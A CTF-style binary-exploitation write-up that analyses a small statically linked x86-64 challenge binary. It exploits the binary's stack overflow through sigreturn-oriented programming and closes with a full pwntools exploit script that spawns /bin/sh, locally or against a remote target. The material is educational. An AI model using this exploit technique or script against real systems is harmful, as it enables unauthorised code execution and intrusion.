2nd Writeup,  
I talked to my Friend @Zopazz from the PWN() Discord Server  
if u want to join ;) https://discord.gg/qJzgHZ5srj

So we talked about what i could learn next and he sends me this binary and
gave me the Hint: Sigreturn()

ok first check what we have.  
```  
┌─[root@Daemon]─[~/ctf/some]  
└──╼ #file some  
some: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked,
stripped  
```  
as we can see it is statically linked so no linked functions from libc and it
is a striped binary so gdb will have some problems so lets use a Decompier
first.

I use cutter (https://github.com/rizinorg/cutter)

lets view the Disassembly i namend the functions read = eax=0   write = eax=1  
```  
 ;-- section..text:  
 ;-- segment.LOAD1:  
ssize_t read (int fildes, void *buf, size_t nbyte);  
; arg int64_t arg1 @ rdi  
; arg int64_t arg2 @ rsi  
0x00401000      mov     rdx, rsi   ; arg2 ; [01] -r-x section size 100 named
.text  
0x00401003      mov     rsi, rdi   ; arg1  
0x00401006      mov     eax, 0  
0x0040100b      mov     rdi, rax  
0x0040100e      syscall  
0x00401010      ret  
ssize_t write (int fd, const char *ptr, size_t nbytes);  
; arg int64_t arg1 @ rdi  
; arg int64_t arg2 @ rsi  
0x00401011      mov     rdx, rsi   ; arg2  
0x00401014      mov     rsi, rdi   ; arg1  
0x00401017      mov     eax, 1  
0x0040101c      mov     rdi, rax  
0x0040101f      syscall  
0x00401021      ret  
int main (int argc, char **argv, char **envp);  
0x00401022      push    rbp  
0x00401023      mov     rbp, rsp  
0x00401026      sub     rsp, 0x1f4  
0x0040102d      movabs  rdi, str.What_you_say_is_what_you_get. ; segment.LOAD2  
                                  ; 0x402000  
0x00401037      mov     esi, 0x1f  ; 31  
0x0040103c      call    write      ; ssize_t write(int fd, const char *ptr,
size_t nbytes)  
0x00401041      lea     rdi, [rsp]  
0x00401045      mov     esi, 0x320 ; 800  
0x0040104a      call    section..text ; read ; ssize_t read(int fildes, void
*buf, size_t nbyte)  
0x0040104f      lea     rdi, [rsp]  
0x00401053      mov     rsi, rax  
0x00401056      call    write      ; ssize_t write(int fd, const char *ptr,
size_t nbytes)  
0x0040105b      leave  
0x0040105c      ret  
entry0 ();  
0x0040105d      call    main       ; int main(int argc, char **argv, char
**envp)  
0x00401062      jmp     entry0  
```  
ok so on the first view i can see that we entry at entry0 that calls main that
writes 'What_you_say_is_what_you_get.' and before that it  creates a
stackframe at `0x00401023 mov rbp, rsp` and `0x00401026 sub rsp, 0x1f4` so we
have a 0x1f4 so a 500 byte stackFrame.  
than it asks for up to 0x320 ; 800 bytes of input

lets try to throw some b'A' at it and get a sense of whats going on before
trying to break it.

`gdb ./some` than run it with `r` and when we are asked for input we do ctrl+c
to break and continue in gdb gef.  
we are at `$rip   : 0x0000000000401010  →   ret` we set a breakpoint here with
`b *0x401010` actualy we are still in the read() that was called by the
`0x000000000040100e  →  syscall` that asks for input ... lets throw
`AAAABBBBCCCCDDDD` so we are sending 16 bytes + 1 byte for the \n at the end
=17 bytes or in hex 0x11

```  
[ Legend: Modified register | Code | Heap | Stack | String ]  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
registers ────  
$rax   : 0x11  
$rbx   : 0x0  
$rcx   : 0x0000000000401010  →   ret  
$rdx   : 0x320  
$rsp   : 0x00007fffffffdf34  →  0x000000000040104f  →   lea rdi, [rsp]  
$rbp   : 0x00007fffffffe130  →  0x0000000000000000  
$rsi   : 0x00007fffffffdf3c  →  "AAAABBBBCCCCDDDD\n"  
$rdi   : 0x0  
$rip   : 0x0000000000401010  →   ret  
$r8    : 0x0  
$r9    : 0x0  
$r10   : 0x0  
$r11   : 0x216  
$r12   : 0x0  
$r13   : 0x0  
$r14   : 0x0  
$r15   : 0x0  
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow
resume virtualx86 identification]  
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
stack ────  
0x00007fffffffdf34│+0x0000: 0x000000000040104f  →   lea rdi, [rsp]       ←
$rsp  
0x00007fffffffdf3c│+0x0008: "AAAABBBBCCCCDDDD\n"         ← $rsi  
0x00007fffffffdf44│+0x0010: "CCCCDDDD\n"  
0x00007fffffffdf4c│+0x0018: 0x000000000000000a  
0x00007fffffffdf54│+0x0020: 0x0000000000000000  
0x00007fffffffdf5c│+0x0028: 0x0000000000000000  
0x00007fffffffdf64│+0x0030: 0x0000000000000000  
0x00007fffffffdf6c│+0x0038: 0x0000000000000000  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
code:x86:64 ────  
    0x401006                  mov    eax, 0x0  
    0x40100b                  mov    rdi, rax  
    0x40100e                  syscall   
●→   0x401010                  ret  
  ↳    0x40104f                  lea    rdi, [rsp]  
       0x401053                  mov    rsi, rax  
       0x401056                  call   0x401011  
       0x40105b                  leave    
       0x40105c                  ret      
       0x40105d                  call   0x401022  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
threads ────  
[#0] Id 1, Name: "some", stopped 0x401010 in ?? (), reason: BREAKPOINT  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
trace ────  
[#0] 0x401010 → ret  
[#1] 0x40104f → lea rdi, [rsp]  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
```  
as we can see it sets rax=0x11 which es basicaly len(input) and now our input
is on top of the stack in the rsp since the ret; poped of the
0x000000000040104f into rip.  
`0x40104f lea    rdi, [rsp]` will load the addr `0x00007fffffffdf3c` into rdi
which than holds our 'AAAABBBBCCCCDDDD\n'  
`0x401053 mov    rsi, rax  ` will load rax=0x11 into rsi.  
`0x401056 call   0x401011  ` calls the write function that sets rax=0x1 and
prints our output to rax=1 so stdout  
`0x40105b leave` will exit the main() back to entry0 that will run main() so
we are in a loop.

ok we understand whats going on and we basically have controll over the rax
from 1-800 so from 0x1 to 0x320

time to throw a lot more b'A' maybe we can overwrite the rsp lets throw
`b'A'*500 + b'BBBBBBBB' + b'CCCCDDDD'`

so we can see that after the program run at `0x40105b leave;` followed by a
`0x40105c ret;` it will load 'CCCCDDDD\n' into the rsp  
and than ret; (what basically does pop rip;) what will load rsp into rip.

```  
[ Legend: Modified register | Code | Heap | Stack | String ]  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
registers ────  
$rax   : 0x205  
$rbx   : 0x0  
$rcx   : 0x0000000000401021  →   ret  
$rdx   : 0x205  
$rsp   : 0x00007fffffffe138  →  "CCCCDDDD\n"  
$rbp   : 0x4242424242424242 ("BBBBBBBB"?)  
$rsi   : 0x00007fffffffdf3c  →
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"  
$rdi   : 0x1  
$rip   : 0x000000000040105c  →   ret  
$r8    : 0x0  
$r9    : 0x0  
$r10   : 0x0  
$r11   : 0x216  
$r12   : 0x0  
$r13   : 0x0  
$r14   : 0x0  
$r15   : 0x0  
$eflags: [zero carry PARITY ADJUST sign trap INTERRUPT direction overflow
RESUME virtualx86 identification]  
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
stack ────  
0x00007fffffffe138│+0x0000: "CCCCDDDD\n"         ← $rsp  
0x00007fffffffe140│+0x0008: 0x000000000000000a  
0x00007fffffffe148│+0x0010: 0x00007fffffffe439  →  "/root/ctf/some/some"  
0x00007fffffffe150│+0x0018: 0x0000000000000000  
0x00007fffffffe158│+0x0020: 0x00007fffffffe44d  →  "SHELL=/usr/bin/bash"  
0x00007fffffffe160│+0x0028: 0x00007fffffffe461  →
"SESSION_MANAGER=local/Daemon:@/tmp/.ICE-unix/888,u[...]"  
0x00007fffffffe168│+0x0030: 0x00007fffffffe4b1  →  "WINDOWID=0"  
0x00007fffffffe170│+0x0038: 0x00007fffffffe4bc  →  "QT_ACCESSIBILITY=1"  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
code:x86:64 ────  
    0x401053                  mov    rsi, rax  
    0x401056                  call   0x401011  
    0x40105b                  leave    
→   0x40105c                  ret  
[!] Cannot disassemble from $PC  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
threads ────  
[#0] Id 1, Name: "some", stopped 0x40105c in ?? (), reason: SIGSEGV  
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
trace ────  
[#0] 0x40105c → ret  
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────  
```

ok we note that we have controll over the rax and we can write up to 800 bytes
into the stack and overflow it.  
on the other side we have to deal with NX and ASLR

here was the point i strugelded a bit i checked vmmap where we can see than NX
is enabled means we cant execute sellcode from the stack.  
```  
[ Legend:  Code | Heap | Stack ]  
Start              End                Offset             Perm Path  
0x0000000000400000 0x0000000000401000 0x0000000000000000 r--
/root/ctf/some/some  
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x
/root/ctf/some/some  
0x0000000000402000 0x0000000000403000 0x0000000000002000 rw-
/root/ctf/some/some  
0x00007ffff7ff9000 0x00007ffff7ffd000 0x0000000000000000 r-- [vvar]  
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000000000 r-x [vdso]  
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]  
```  
i thought ok maybe we can ROP and i checked ropper to find avilable gadgets

```

Gadgets  
=======

0x0000000000401007: add byte ptr [rax], al; add byte ptr [rax], al; mov rdi,
rax; syscall;  
0x0000000000401007: add byte ptr [rax], al; add byte ptr [rax], al; mov rdi,
rax; syscall; ret;  
0x0000000000401009: add byte ptr [rax], al; mov rdi, rax; syscall;  
0x0000000000401009: add byte ptr [rax], al; mov rdi, rax; syscall; ret;  
0x0000000000401018: add dword ptr [rax], eax; add byte ptr [rax], al; mov rdi,
rax; syscall;  
0x0000000000401018: add dword ptr [rax], eax; add byte ptr [rax], al; mov rdi,
rax; syscall; ret;  
0x000000000040100f: add eax, 0xf28948c3; mov rsi, rdi; mov eax, 1; mov rdi,
rax; syscall;  
0x0000000000401052: and al, 0x48; mov esi, eax; call 0x1011; leave; ret;  
0x000000000040104a: call 0x1000; lea rdi, [rsp]; mov rsi, rax; call 0x1011;
leave; ret;  
0x0000000000401056: call 0x1011; leave; ret;  
0x0000000000401051: cmp al, 0x24; mov rsi, rax; call 0x1011; leave; ret;  
0x000000000040104e: dec dword ptr [rax - 0x73]; cmp al, 0x24; mov rsi, rax;
call 0x1011; leave; ret;  
0x000000000040105a: dec ecx; ret;  
0x0000000000401050: lea edi, [rsp]; mov rsi, rax; call 0x1011; leave; ret;  
0x000000000040104f: lea rdi, [rsp]; mov rsi, rax; call 0x1011; leave; ret;  
0x0000000000401006: mov eax, 0; mov rdi, rax; syscall;  
0x0000000000401006: mov eax, 0; mov rdi, rax; syscall; ret;  
0x0000000000401017: mov eax, 1; mov rdi, rax; syscall;  
0x0000000000401017: mov eax, 1; mov rdi, rax; syscall; ret;  
0x000000000040100c: mov edi, eax; syscall;  
0x000000000040100c: mov edi, eax; syscall; ret;  
0x0000000000401001: mov edx, esi; mov rsi, rdi; mov eax, 0; mov rdi, rax;
syscall;  
0x0000000000401001: mov edx, esi; mov rsi, rdi; mov eax, 0; mov rdi, rax;
syscall; ret;  
0x0000000000401012: mov edx, esi; mov rsi, rdi; mov eax, 1; mov rdi, rax;
syscall;  
0x0000000000401012: mov edx, esi; mov rsi, rdi; mov eax, 1; mov rdi, rax;
syscall; ret;  
0x0000000000401054: mov esi, eax; call 0x1011; leave; ret;  
0x0000000000401004: mov esi, edi; mov eax, 0; mov rdi, rax; syscall;  
0x0000000000401004: mov esi, edi; mov eax, 0; mov rdi, rax; syscall; ret;  
0x0000000000401015: mov esi, edi; mov eax, 1; mov rdi, rax; syscall;  
0x0000000000401015: mov esi, edi; mov eax, 1; mov rdi, rax; syscall; ret;  
0x000000000040100b: mov rdi, rax; syscall;  
0x000000000040100b: mov rdi, rax; syscall; ret;  
0x0000000000401000: mov rdx, rsi; mov rsi, rdi; mov eax, 0; mov rdi, rax;
syscall;  
0x0000000000401000: mov rdx, rsi; mov rsi, rdi; mov eax, 0; mov rdi, rax;
syscall; ret;  
0x0000000000401011: mov rdx, rsi; mov rsi, rdi; mov eax, 1; mov rdi, rax;
syscall;  
0x0000000000401011: mov rdx, rsi; mov rsi, rdi; mov eax, 1; mov rdi, rax;
syscall; ret;  
0x0000000000401053: mov rsi, rax; call 0x1011; leave; ret;  
0x0000000000401003: mov rsi, rdi; mov eax, 0; mov rdi, rax; syscall;  
0x0000000000401003: mov rsi, rdi; mov eax, 0; mov rdi, rax; syscall; ret;  
0x0000000000401014: mov rsi, rdi; mov eax, 1; mov rdi, rax; syscall;  
0x0000000000401014: mov rsi, rdi; mov eax, 1; mov rdi, rax; syscall; ret;  
0x000000000040105b: leave; ret;  
0x0000000000401010: ret;  
0x000000000040100e: syscall;  
0x000000000040100e: syscall; ret;  
```

that does not look good i cant spot a pop gadget so we cant pop directly into
a register.  
i had no idea so i asked @Zopazz for a little Hint... Sigreturn

ok what is Sigreturn... i looked up the man page https://man7.org/linux/man-
pages/man2/sigreturn.2.html  
it basically pops the stack into all of the registes so we have to build a
sigreturnFrame on our stack.

```  
####################  
FPSTATE            #  
####################  
MASK               #  
####################  
_RESERVED          #  
####################  
&FPSTATE           #  
####################  
CR2                #  
####################  
OLDMASK            #  
####################  
TRAPNO             #  
####################  
ERR                #  
####################  
CS  |GS  |FS  |    #  
####################  
EFLAGS             #  
####################  
RIP                #  
####################  
RSP                #  
####################  
RCX                #  
####################  
RAX                #  
####################  
RDX                #  
####################  
RBX                #  
####################  
RBP                #  
####################  
RSI                #  
####################  
RSI                #  
####################  
RDI                #  
####################  
R15                #  
####################  
...                #  
####################  
R8                 #  
####################  
SS_SIZE            #  
####################  
SS_FLAGS           #  
####################  
SS_SP              #  
####################  
UC_LINK            #  
####################  
UC_FLAGS           #  
####################  
RIP = SIGRETURN    #  
####################  
saved rbp          #  
####################

```

ok building this by hand would take a loooooooong time :D so good that we have
python3 and pwntools.  
pwntools can build the SigreturnFrame for us.  
so we want to Write somewhere in this region `0x0000000000402000
0x0000000000403000 0x0000000000002000 rw- /root/ctf/some/some` as this is the
only region where we can write to and it is not affected by ASLR.

```  
 frame1 = SigreturnFrame(kernel='amd64')  
 frame1.rip = 0x40100e           #rip = addr of gadget(syscall; ret;)  
 frame1.rdi = 0x0                #rdi = 0 read from stdin  
 frame1.rsi = 0x40203b           #rsi = arg1 = where we want to save the input
0x0000000000402000 0x0000000000403000 0x0000000000002000 rw-
/root/ctf/some/some since only Aslr is enabled we choose this sctions as it is
not affected by aslr only by PIE which is not active so these addresses will
not get randomized  
 frame1.rdx = 0x320              #rdx = arg2 = how much bytes we can read in  
 frame1.rax = 0x0                #rax = syscall read(rdi,rsi,rdx) this reads
our input(stdin) and stores it at rsi & rsp since they are on the same addres
now  
 frame1.rsp = 0x40203b           #set rsp  
 frame1.rbp = 0x402043           #set rbp  
```  
ok our frame is rdy now we construct the 1st payload  
```  
#1st input  
 payload1 = b'A'*500             # fill the buffer  
 payload1 += b'\x00'*8           # fill the rbp  
 payload1 += p64(0x401006)       #1st ret # places the ret point to 0x00401006
gadget( mov eax,0 ;mov rdi,rax; syscall ; ret; )  
 payload1 += p64(0x40100e)       #2nd ret # places the ret point to 0x0040100e
gadget( syscall ; ret;) that than executes sigret() that sets the registers
for syscall again now as read(0x0,40203b,0x320) which stores our input
beginning at 0x40203b  
 payload1 += bytes(frame1)       #places the SigretrunFrame on the Stack for
the sigreturn() that gets poped into the registers  
 sl(payload1)  
```  
this will fill the buffer with 508 bytes of junk than sest a read() and a
syscall() gadget on the stack and than our prepared SigreturnFrame.

than we jump to 0x401006 which is our read() we input 15 bytes to set rax=0xf
which is the argument for syscall sigreturn()  
```  
 payload2 = b'ABCDEFGHIJKLM\x00'  
 sl(payload2)  
```

than we ret; to 0x40100e which is a syscall with the argument rax=0xf so a
syscall sigreturn that load our SigreturnFrame.

we prepared the frame that rip pointd to a syscall rax(rdi,rsi,rdx) that will
be executed next.  
`rax = 0x0` so read()  
`rdi = 0x0` so from stdin  
`rsi = 0x40203b` which is the addr where our new stackframe starts ( rsp and
rbp were defined by the Sigreturn)  
`rdx = 0x320` so up to 800 bytes (we will need to write the /bin/sh as far
into memory as possible ... with my solution but more later)

now we can input our next Payload that will place 2 read() gadgets on the
stack and our /bin/sh string into 0x402353 and uses 800 bytes so our
/bin/sh\00 string starts at 0x402353 so there are basically 792 bytes that we
dont care about if they change in furter read().  
```  
payload3 = p64(0x401006) + p64(0x401006) + b'A'*776 +b'/bin/sh\x00'  
sl(payload3)  
```

now we can create the next SigreturnFrame for our execve(/bin/sh,0,0) as we
now have the /bin/sh string in a place of memory that is not afected by ASLR

```  
frame2 = SigreturnFrame(kernel='amd64')  
frame2.rip = 0x40100e           #rip = addr of syscall gadget  
frame2.rdi = 0x402353           #rdi = addr of "/bin/sh"  
frame2.rsi = 0x0                #rsi = arg1  
frame2.rdx = 0x0                #rdx = arg2  
frame2.rax = 0x3b               #rax = execve  
```  
than we create our next payload as we are now on the 1st of the 2 read() which
we wrote on the stack in the last step.  
read(0,0x40203b,0x320) which will not overwrite our /bin/sh since we are only
sending 280 bytes.

```  
 payload = b'A'*8                #fill the buffer  
 payload += b'B'*8               #fill the rbp  
 payload += p64(0x401006)        #5th ret point to read() again to setup the
rax to 0xf  
 payload += p64(0x40100e)        #6th ret point to sigret() that setup the
registers and sets rip to a syscall than executes execve(/bin/sh,0,0)  
 payload += bytes(frame2)  
 sl(payload)  
```  
that stores another read() and a syscall() gadget and our 2nd SigreturnFrame
on the Stack.

we ret; to the 2nd 0x401006 read() that sets our rax=0xf')

```  
 payload = b'ABCDEFGHIJKLMN'       #14 bytes + 1 from the \n at the end =0xf  
 sl(payload)  
```  
now we ret: to 0x40100e syscall 0xf which is a syscall sigreturn() again.  
our SigreturnFrame gets loadet and rip is set to another syscall() now with
registes setup to syscall 0x3b(0x402353,0,0) which means syscall
execve(/bin/sh,0,0)

ok now we put all of it together and add some informations whats going on ...
and i addet some breaks for better debugging.

Here is my Exploit  
```  
#!/usr/bin/env python3  
from pwn import *

fname = './some'  
ip = ''#change this  
port = ''#change this

context.arch = 'amd64'  
elf = ELF(fname)  
context.update(os='linux', arch='amd64')  
x = 1

LOCAL = True

if LOCAL:  
   r = process(fname,aslr=True)  
else:  
   r = remote(ip, port)

rl = lambda : r.recvline()  
sl = lambda x : r.sendline(x)  
inter = lambda : r.interactive()

def pwn():

#Stage 1 writes /bin/sh\x00 into memory at 0x40203b + 792 = 0x402353

 frame1 = SigreturnFrame(kernel='amd64')  
 frame1.rip = 0x40100e           #rip = addr of gadget(syscall; ret;)  
 frame1.rdi = 0x0            #rdi = 0 read from stdin  
 frame1.rsi = 0x40203b           #rsi = arg1 = where we want to save the input
0x0000000000402000 0x0000000000403000 0x0000000000002000 rw-
/root/ctf/some/some since only Aslr is enabled we choose this sctions as it is
not affected by aslr only by PIE which is not active so these addresses will
not get randomized.  
 frame1.rdx = 0x320            #how much bytes we can pass  
 frame1.rax = 0x0              #rax = syscall read(rdi,rsi,rdx) this reads our
input(stdin) and stores it at rsi & rsp since they are on the same addres now  
 frame1.rsp = 0x40203b         #set rsp  
 frame1.rbp = 0x402043         #set rbp

 #1st input  
 payload1 = b'A'*500             # fill the buffer  
 payload1 += b'\x00'*8           # fill the rbp  
 payload1 += p64(0x401006)  
 payload1 += p64(0x40100e)  
 payload1 += bytes(frame1)       #places the sigret frame on the stack for the
sigreturn() that gets poped into the registers  
 sl(payload1)

log.info('Frame for Sigreturn created')  
log.info('initial Input send!')  
log.info('1# we fill the buffer')  
log.info('2# we set our gadgets')  
log.info('3# we place the SigreturnFrame')

 input("Press Enter to continue...")  
log.info('4# our 2nd input from the 1st ret sets rax=0xf which is the argument
for syscall sigret()')  
log.info('5# we execute syscall sigret() which places our SigreturnFrame into
all registers')

 #print(rl())  
 payload2 = b'ABCDEFGHIJKLM\x00'  
 sl(payload2)

 input("Press Enter to continue...")  
log.info('6# our sigret() setup a read() with rax=0 from rdi=0 stdin into
rsi=0x40203b , rdx=0x320 and executes it as it sets the rip to the next
syscall() at rip=0x40100e')  
log.info('7# our 3rd input from the 2nd ret; to read(0,0x40203b,0x320) that
sets next ret; to a read() again')  
log.info('8# we read in our input and setup 3rd and 4th ret points both to the
read() than stores /bin/sh to 0x402353')

  
 sleep(x)  
 payload3 = p64(0x401006) + p64(0x401006) + b'A'*776 +b'/bin/sh\x00'  
 sl(payload3)

 #Stage 2 execve(/bin/sh,0,0)

log.info('9# we create the next SigreturnFrame')

 frame2 = SigreturnFrame(kernel='amd64')  
 frame2.rip = 0x40100e           #rip = addr of syscall gadget  
 frame2.rdi = 0x402353           #rdi = addr of "/bin/sh"  
 frame2.rsi = 0x0                #rsi = arg1  
 frame2.rdx = 0x0                #rdx = arg2  
 frame2.rax = 0x3b               #rax = execve

 input("Press Enter to continue...")  
log.info('10# we ret; to our 1st 0x401006 read(0,0x40203b,0x320) that stores a
read and a syscall gadget and the 2nd SigreturnFrame on the Sack')

 sleep(x)  
 payload = b'A'*8                #fill the buffer  
 payload += b'B'*8               #fill the rbp  
 payload += p64(0x401006)        #5th ret point to read() again to setup the
rax to 0xf  
 payload += p64(0x40100e)        #6th ret point to sigret() that setup the
registers and sets rip to a syscall than executes execve(/bin/sh,0,0)  
 payload += bytes(frame2)  
 sl(payload)

  
 input("Press Enter to continue...")  
log.info('11# we ret; to the 2nd 0x401006 and again to a read() that sets our
rax=0xf')

 sleep(x)  
 payload = b'ABCDEFGHIJKLMN'       #14 bytes + 1 from the \n at the end =0xf  
 sl(payload)

log.info('now the 2nd SigreturnFrame gets loaded into registers that setup a
syscall for exeve(0x402353,0,0) and executes it')  
log.info('0x402353 contains our /bin/sh string')

log.info('GG we get a shell :)')

 inter()  
if __name__ == '__main__':  
   pwn()

```  

Original writeup (https://github.com/Bex-WriteUp/binary-
exploitation/blob/main/some_writeup.md).